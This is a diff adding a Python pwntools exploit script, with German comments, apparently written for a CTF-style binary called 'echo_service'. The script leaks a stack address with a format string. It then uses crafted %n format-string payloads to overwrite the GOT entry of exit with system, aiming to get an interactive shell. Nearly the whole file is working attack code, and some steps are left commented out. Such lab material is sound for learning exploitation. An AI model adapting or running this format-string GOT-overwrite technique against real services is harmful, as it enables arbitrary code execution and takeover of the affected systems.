@@ -1,0 +1,87 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./echo_service", checksec=False)
+context.log_level = "error"
+
+# Format String Override auf Stack (200 Size hab ich, 4 ist die Variable selbst)
+# Idee: Got overflow auf exit 
+# ==> adresse von system bei got in exit überschreiben
+# + es müsste bin/sh auf dem Stack liegen für echo_service (adresse davon)
+# 
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    b *0x0804933e
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def writeBinSh(io, binsh, ):
+    exploit = b""
+    exploit += b"%1$p"
+    
+    io.recvuntil(b">>")
+    io.sendline(b"1")
+    io.recvuntil(b">")
+    io.sendline(exploit)
+    addr = io.recvuntil(b">>")[1:11]
+    addr = int(addr, 16) - 76
+
+    exploit = b""
+    exploit += p32(addr)
+    exploit += b"%19$123456x"
+    exploit += b"%19$n" 
+
+    io.sendline(b"1")
+    io.recvuntil(b"\n")
+    io.sendline(exploit)
+
+def gotExitOverwriteWithSystem(io, exit, system):
+    exploit = b""
+    exploit += p32(exit)
+    exploit += p32(exit + 2)
+    exploit += b"%19$17048x"
+    exploit += b"%19$n" # 
+    exploit += b"%20$46398x"
+    exploit += b"%20$n"
+
+    io.recvuntil(b">>")
+    io.sendline(b"1")
+    io.recvuntil(b">")
+    io.sendline(exploit)
+
+def main():
+    io = start()
+
+    # add your exploit code here
+    libc = ELF(exe.libc.path, checksec=False) # Load libc
+    exit = exe.got["exit"] # Got Entry of Exit (will be overwritten by loader with actual addr from libc)
+    system = libc.sym["system"] # What we actually want to write there 
+    binsh = next(libc.search(b'/bin/sh')) # we also need a parameter to start a shell
+
+    gotExitOverwriteWithSystem(io, exit, system)
+
+    #writeBinSh(io, binsh)
+
+    io.interactive()
+    #io.recvuntil(b">>")
+    #io.sendline(b"2")
+
+
+
+if __name__ == "__main__":
+    main()
